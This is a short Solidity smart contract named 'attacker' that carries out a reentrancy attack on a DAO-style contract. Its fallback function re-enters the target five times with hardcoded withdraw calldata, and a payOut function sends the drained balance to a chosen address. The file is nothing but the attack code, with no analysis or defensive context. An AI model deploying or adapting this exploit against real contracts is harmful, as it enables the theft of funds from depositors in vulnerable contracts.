contract attacker {
  address public daoAddress;

  function () {
    //while loop
    uint a = 0;
    while (a<5) {
      daoAddress.call(0xf3fef3a30000000000000000000000009e2a2544c356ee3805e76456fa5e15d7d7e4c8b9000000000000000000000000000000000000000000000002b5e3af16b1880000); //function signature to withdraw
      a++;
    }
  }

  function setDaoAddress(address _dao) {
    daoAddress = _dao;
  }

  function payOut(address _payee) returns (bool){
    if (_payee.send(this.balance))
    return true;
  }

}
